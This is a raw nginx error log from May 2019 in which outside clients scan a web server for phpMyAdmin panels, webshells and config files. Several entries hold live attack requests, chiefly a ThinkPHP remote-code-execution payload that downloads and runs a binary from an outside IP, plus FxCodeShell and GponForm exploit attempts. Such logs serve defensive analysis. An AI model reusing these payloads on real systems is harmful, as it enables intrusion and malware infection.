2019/05/10 02:25:24 [notice] 25#25: signal process started
2019/05/10 14:04:46 [error] 6#6: *133 open() "/usr/share/nginx/html/phpmyadmin2018/index.php" failed (2: No such file or directory), client: 220.133.18.143, server: localhost, request: "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/10 14:04:46 [error] 6#6: *134 open() "/usr/share/nginx/html/phpmyadmin2019/index.php" failed (2: No such file or directory), client: 220.133.18.143, server: localhost, request: "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/10 14:04:47 [error] 6#6: *135 open() "/usr/share/nginx/html/index.php" failed (2: No such file or directory), client: 220.133.18.143, server: localhost, request: "GET /index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/10 15:38:00 [error] 6#6: *139 open() "/usr/share/nginx/html/otsmobile/app/mgs/mgw.htm" failed (2: No such file or directory), client: 43.241.229.9, server: localhost, request: "GET /otsmobile/app/mgs/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B%22train_date%22%3A%2220190520%22%2C%22purpose_codes%22%3A%2200%22%2C%22from_station%22%3A%22BJP%22%2C%22to_station%22%3A%22WHN%22%2C%22station_train_code%22%3A%22Z35%22%2C%22start_time_begin%22%3A%220000%22%2C%22start_time_end%22%3A%222400%22%2C%22train_headers%22%3A%22QB%23%22%2C%22train_flag%22%3A%22%22%2C%22seat_type%22%3A%220%22%2C%22seatBack_Type%22%3A%22%22%2C%22ticket_num%22%3A%22%22%2C%22dfpStr%22%3A%22%22%2C%22secret_str%22%3A%22%E5%90%8E%E5%8F%B0%E5%BC%80%E5%85%B3%E8%8E%B7%E5%8F%96%E5%A4%B1%E8%B4%A5%EF%BC%8C%E6%88%96%E9%85%8D%E7%BD%AE%E5%BC%80%E5%85%B3%E4%B8%BAfalse.null%22%2C%22baseDTO%22%3A%7B%22check_code%22%3A%223c8fdb1b69d46e763404a67338a7947e%22%2C%22device_no%22%3A%22XNWa1yKfTVMDALlXw7JxOPmq%22%2C%22mobile_no%22%3A%22%22%2C%22os_type%22%3A%22a%22%2C%22time_str%22%3A%2220190510233759%22%2C%22user_name%22%3A%22%22%2C%22version_no%22%3A%223.0.0.12121430%22%7D%7D%5D&ts=1557502679562&sign= HTTP/1.1", host: "mobile.12306.cn"
2019/05/11 00:26:51 [error] 6#6: *161 open() "/usr/share/nginx/html/index.php" failed (2: No such file or directory), client: 185.172.110.217, server: localhost, request: "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://83.166.246.230/bins/hot;%20chmod%20777%20hot;./hot20thinkphp HTTP/1.1", host: "134.175.99.71:80"
2019/05/11 03:06:58 [error] 6#6: *169 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 159.203.82.187, server: localhost, request: "POST /GponForm/diag_Form?style/ HTTP/1.1", host: "192.168.0.1:443"
2019/05/11 06:08:35 [error] 6#6: *181 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 94.102.49.193, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "134.175.99.71"
2019/05/11 06:08:37 [error] 6#6: *182 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 94.102.49.193, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "134.175.99.71"
2019/05/11 06:08:41 [error] 6#6: *183 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 94.102.49.193, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "134.175.99.71"
2019/05/11 06:08:45 [error] 6#6: *184 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 94.102.49.193, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:30 [error] 6#6: *193 open() "/usr/share/nginx/html/mysql/admin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /mysql/admin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:31 [error] 6#6: *194 open() "/usr/share/nginx/html/mysql/dbadmin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:32 [error] 6#6: *195 open() "/usr/share/nginx/html/mysql/sqlmanager/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:32 [error] 6#6: *196 open() "/usr/share/nginx/html/mysql/mysqlmanager/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:34 [error] 6#6: *197 open() "/usr/share/nginx/html/phpmyadmin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpmyadmin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:36 [error] 6#6: *198 open() "/usr/share/nginx/html/phpMyadmin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpMyadmin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:36 [error] 6#6: *199 open() "/usr/share/nginx/html/phpMyAdmin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpMyAdmin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:38 [error] 6#6: *200 open() "/usr/share/nginx/html/phpmyAdmin/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpmyAdmin/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:38 [error] 6#6: *201 open() "/usr/share/nginx/html/phpmyadmin2/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpmyadmin2/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:00:40 [error] 6#6: *202 open() "/usr/share/nginx/html/phpmyadmin3/index.php" failed (2: No such file or directory), client: 212.117.93.206, server: localhost, request: "GET /phpmyadmin3/index.php?lang=en HTTP/1.1", host: "134.175.99.71"
2019/05/11 08:38:59 [error] 6#6: *206 open() "/usr/share/nginx/html/index.php" failed (2: No such file or directory), client: 185.172.110.217, server: localhost, request: "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://83.166.246.230/bins/hot;%20chmod%20777%20hot;./hot20thinkphp HTTP/1.1", host: "134.175.99.71:80"
2019/05/11 08:56:38 [error] 6#6: *207 open() "/usr/share/nginx/html/FxCodeShell.jsp" failed (2: No such file or directory), client: 134.175.151.59, server: localhost, request: "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1", host: "134.175.99.71", referrer: "http://134.175.99.71:80/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe"
2019/05/11 09:36:17 [error] 6#6: *208 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 159.203.82.187, server: localhost, request: "POST /GponForm/diag_Form?style/ HTTP/1.1", host: "192.168.0.1:443"
2019/05/11 12:09:27 [error] 6#6: *210 open() "/usr/share/nginx/html/index.php" failed (2: No such file or directory), client: 185.172.110.217, server: localhost, request: "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://83.166.246.230/bins/hot;%20chmod%20777%20hot;./hot20thinkphp HTTP/1.1", host: "134.175.99.71:80"
2019/05/11 13:43:53 [error] 6#6: *218 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 216.144.240.130, server: localhost, request: "HEAD /robots.txt HTTP/1.0"
2019/05/11 15:33:39 [error] 6#6: *220 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 159.203.82.187, server: localhost, request: "POST /GponForm/diag_Form?style/ HTTP/1.1", host: "192.168.0.1:443"
2019/05/11 20:45:42 [error] 6#6: *235 open() "/usr/share/nginx/html/phpmyadmin3/index.php" failed (2: No such file or directory), client: 59.36.119.227, server: localhost, request: "GET /phpmyadmin3/index.php?lang%3Den HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:22:44 [error] 6#6: *244 open() "/usr/share/nginx/html/manager/html" failed (2: No such file or directory), client: 119.205.193.75, server: localhost, request: "GET /manager/html HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/App4763af86.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "POST /App4763af86.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *249 "/usr/share/nginx/html/webdav/index.html" is not found (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /webdav/ HTTP/1.1", host: "134.175.99.71:80"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/help.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /help.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/java.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /java.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/_query.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /_query.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/test.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /test.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:24 [error] 6#6: *248 open() "/usr/share/nginx/html/db_cts.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /db_cts.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/db_pma.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /db_pma.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/logon.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /logon.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/help-e.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /help-e.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/license.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /license.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/log.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /log.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/hell.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /hell.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/pmd_online.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /pmd_online.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/x.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /x.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/shell.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /shell.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/htdocs.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /htdocs.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/b.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /b.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/sane.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /sane.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/desktop.ini.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /desktop.ini.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/z.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /z.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/lala.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /lala.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/lala-dpr.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /lala-dpr.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:25 [error] 6#6: *248 open() "/usr/share/nginx/html/wpc.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /wpc.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/wpo.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /wpo.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/t6nv.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /t6nv.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/muhstik.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /muhstik.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/text.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /text.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/wp-config.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /wp-config.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/muhstik.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /muhstik.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/muhstik2.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /muhstik2.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/muhstiks.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /muhstiks.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/muhstik-dpr.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /muhstik-dpr.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/lol.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /lol.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/uploader.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /uploader.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/cmd.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /cmd.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:26 [error] 6#6: *248 open() "/usr/share/nginx/html/cmv.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /cmv.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:27 [error] 6#6: *248 open() "/usr/share/nginx/html/cmdd.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /cmdd.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:27 [error] 6#6: *248 open() "/usr/share/nginx/html/knal.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /knal.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:28 [error] 6#6: *248 open() "/usr/share/nginx/html/cmd.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /cmd.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:28 [error] 6#6: *248 open() "/usr/share/nginx/html/shell.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /shell.php HTTP/1.1", host: "134.175.99.71"
2019/05/12 00:23:28 [error] 6#6: *248 open() "/usr/share/nginx/html/appserv.php" failed (2: No such file or directory), client: 119.3.230.3, server: localhost, request: "GET /appserv.php HTTP/1.1", host: "134.175.99.71"
